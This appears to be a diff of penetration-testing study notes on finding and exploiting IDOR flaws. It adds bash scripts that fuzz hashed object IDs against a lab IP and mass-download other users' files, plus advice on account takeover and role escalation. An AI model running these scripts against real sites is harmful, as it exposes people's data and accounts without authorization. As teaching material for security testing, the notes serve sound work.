@@ -1,6 +1,6 @@
 # Detecting and Enumerating IDOR
 
-#### URL paramters and APIs&#x20;
+### URL parameters and APIs&#x20;
 
 Look for parameters that appear to be direct object references. for example:
 
@@ -8,9 +8,9 @@ Look for parameters that appear to be direct object references. for example:
 ?uid=1 or ?filename=file_1.pdf
 ```
 
-These parameters can then be incremented or fuzzed.
+These parameters can then be incremented or fuzzed. We should pay close attention to the page to look for changes when we change the parameters. For example, in applications that show documents or files for specific users, we may see different files if we change the parameter which would indicate we had found and IDOR vulnerability.&#x20;
 
-#### AJAX Calls
+### AJAX Calls
 
 Look for unused parameters or API's in the front end code in the form of JavaScript AJAX calls. these may have been accidentally placed or left here and by modifying the HTTP request, we can possibly find an IDOR vulnerability.&#x20;
 
@@ -28,7 +28,7 @@ function changeUserPassword() {
 }
 ```
 
-#### Hashing/Encoding
+### Hashing/Encoding
 
 For parameter input, the application may not always use a plain text value and instead could encode or hash the reference. If this is found the value could possibly be deoded, changed, and then re encoded to attempt to access sensitive data.&#x20;
 
@@ -48,7 +48,38 @@ $.ajax({
 
 This can make it easy for us to calculate other reference values we would like to fuzz. If we cannot find the hash algorithm in an ajax call in the front end code, then we can use some hash identifier tools to attempt to learn the hash type.
 
-#### User Roles
+Using this information, we can fuzz the parameter with the correct encoding.&#x20;
+
+take for example this source code, which base64 encodes the value, then md5 hashes:
+
+```
+function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+```
+
+We could then craft a bash script, (or you could use burp intruder or zap) to properly modify the payload before sending it:
+
+```
+#!/bin/bash
+
+for i in {1..20}; do
+	value=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
+	curl -sOJ -X POST -d "contract=$value" http://94.237.123.87:59911/download.php
+done
+```
+
+some points about this script:
+
+-n on the echo removes newline, which will get encoded and change the value if included&#x20;
+
+tr -d ' -' removes the trailing ' -' from the output of the md5sum.
+
+Make sure to review the source code and find out how the encoded value is being generated &#x20;
+
+### User Roles
 
 By registering multiple users and comparing their HTTP requests and object references, this may allow us to better understand how the URL parameters and object references are formatted, so we can use this to our advantage when looking for IDOR.
 
@@ -65,3 +96,59 @@ By registering multiple users and comparing their HTTP requests and object refer
 }
 ```
 
+We can try to make the same API call when logged in as user2, and if the call is successful we know there is an IDOR vulnerability.&#x20;
+
+### Mass Enumeration
+
+We can fuzz with tools like Burp Suite, ZAP, or ffuf.&#x20;
+
+#### Bash Script to download all files
+
+Use the element inspector in the browser to identify the elements for the files and find a string to grep on:
+
+```
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
+
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+
+Then we can craft a regex just to get the file names we want:&#x20;
+
+```shell-session
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+```
+
+and finally use a for loop in bash to loop through user ID's and download all files with wget.&#x20;
+
+```
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+### Insecure API's and Function Calls&#x20;
+
+This can be determined by examining requests going out to the server that are updated on the back end. We look for REST calls to API endpoints. these typically use PUT, POST, GET, and DELETE to interact with the API endpoint, and many times use json for the request body. i.e:
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+We should look for interesting parameters which may have the possibility of an IDOR vulnerability, such as uid, uuid, or role in this instance. We should also look to see if any of these values are being set on our cookie and used for access control, as those can be valuable targets. That typically means the access control is being set client side, which we can modify. We can aim to attempt the following:
+
+1. Change our `uid` to another user's `uid`, such that we can take over their accounts
+2. Change another user's details, which may allow us to perform several web attacks
+3. Create new users with arbitrary details, or delete existing users
+4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions
+
+### Chaining IDOR vulnerabilities
+
+Its important to keep in mind that one IDOR vulnerability may lead to another. sensitive information leaked in an information disclosure IDOR might be able to be utilized to exploit insecure API's or function calls. You may be able to use this to modify user details, change a users email address to one you control and request a password reset link, place an XSS in a user detail field, etc.&#x20;
